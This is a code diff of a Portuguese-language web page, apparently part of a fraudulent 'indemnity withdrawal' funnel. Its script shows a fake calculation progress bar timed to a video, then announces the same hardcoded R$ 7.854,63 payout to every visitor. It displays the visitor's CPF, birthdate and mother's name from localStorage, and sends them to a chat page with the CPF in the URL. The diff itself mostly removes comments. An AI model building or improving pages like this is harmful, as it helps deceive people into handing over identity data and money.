@@ -100,6 +100,8 @@
       font-family: Arial, Helvetica, sans-serif !important;
     }
   </style>
+
+
   <script>
     tailwind.config = {
       theme: {
@@ -116,7 +118,6 @@
       }
     }
 
-    // Script para atualizar a barra de progresso
     document.addEventListener('DOMContentLoaded', function () {
       let progress = 16.1375;
       const progressBar = document.querySelector('.progress-bar');
@@ -126,123 +127,74 @@
       const userName = document.getElementById('user-name');
       let calculoConcluido = false;
       let userName_value = '';
-
-      // Duração do vídeo estimada em 133 segundos (2 minutos e 13 segundos)
       const videoDurationSeconds = 133;
-
-      // Progresso total que falta
       const remainingProgress = 100 - progress;
-
-      // Calcular o incremento necessário para sincronizar com o vídeo
-      // Usaremos um intervalo de 500ms para uma animação suave
-      const updateInterval = 500; // Meio segundo
-
-      // Quantas atualizações acontecerão durante a duração do vídeo
+      const updateInterval = 500;
       const totalUpdates = (videoDurationSeconds * 1000) / updateInterval;
-
-      // Quanto deve aumentar a cada atualização
       const incrementPerUpdate = remainingProgress / totalUpdates;
-
-      // Encontrar o botão de saque que já está no HTML
       const saqueButton = document.getElementById('saque-button');
 
-      // Função para redirecionar para a página de chat
       saqueButton.addEventListener('click', function () {
-        // Obter os parâmetros da URL atual
         const urlParams = new URLSearchParams(window.location.search);
         const cpf = urlParams.get('cpf') || '';
-
-        // Criar a URL para a página de chat
         const chatUrl = new URL('../chat', window.location.origin);
-
-        // Adicionar CPF à URL
         if (cpf) {
           chatUrl.searchParams.set('cpf', cpf);
         }
-
-        // Copiar todos os parâmetros UTM existentes
         for (const [key, value] of urlParams.entries()) {
-          if (key !== 'cpf') {  // Evitar duplicação do parâmetro CPF
+          if (key !== 'cpf') {
             chatUrl.searchParams.set(key, value);
           }
         }
-
-        // Redirecionar para a página de chat
         window.location.href = chatUrl.toString();
       });
 
-      // Iniciar o intervalo para atualizar a barra de progresso
       const interval = setInterval(() => {
         progress += incrementPerUpdate;
-
         if (progress >= 100) {
           clearInterval(interval);
           progress = 100;
-
-          // Quando a barra chegar a 100%, mudar os textos
           if (!calculoConcluido) {
             calculoConcluido = true;
-
-            // Obter o nome do usuário
             userName_value = userName.textContent || '';
-
-            // Atualizar textos
             if (calculoTitle) {
               calculoTitle.textContent = `${userName_value}, o seu valor é R$ 7.854,63!`;
             }
-
             if (calculoDesc) {
               calculoDesc.textContent = 'Sua indenização foi calculada com sucesso, clique no botão abaixo para realizar o seu saque indenizatório.';
             }
-
             if (valorDisponivel) {
               const valorSpan = valorDisponivel.querySelector('span:last-child');
               if (valorSpan) {
                 valorSpan.textContent = 'R$ 7.854,63';
               }
             }
-
-            // Mostrar o botão de saque
             saqueButton.style.display = 'block';
           }
         }
-
         progressBar.style.width = progress + '%';
       }, updateInterval);
 
-      // Carregar dados do usuário do localStorage
       const userDataString = localStorage.getItem('userData');
       if (userDataString) {
         try {
           const userData = JSON.parse(userDataString);
-
-          // Preencher os dados nas seções correspondentes
           document.getElementById('user-name').textContent = userData.nome || '';
           document.getElementById('user-birthdate').textContent = userData.dataNascimento || '';
-
-          // Formatar o CPF com pontos e traço (000.000.000-00)
           const formatCPF = (cpf) => {
-            // Garantir que o CPF tenha 11 dígitos, removendo caracteres não numéricos
             cpf = cpf.replace(/\D/g, '');
-
-            if (cpf.length !== 11) {
-              return cpf; // Retorna o CPF original se não tiver 11 dígitos
-            }
-
-            // Formatação: 000.000.000-00
+            if (cpf.length !== 11) return cpf;
             return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
           };
-
           document.getElementById('user-cpf').textContent = formatCPF(userData.cpf) || '';
           document.getElementById('user-mother').textContent = userData.nomeMae || '';
         } catch (error) {
           console.error('Erro ao carregar dados do usuário:', error);
         }
-      } else {
-        console.warn('Nenhum dado de usuário encontrado no localStorage');
       }
     });
   </script>
+
 </head>
 
 <body class="overflow-y-hidden max-h-screen bg-[#831BD1]"
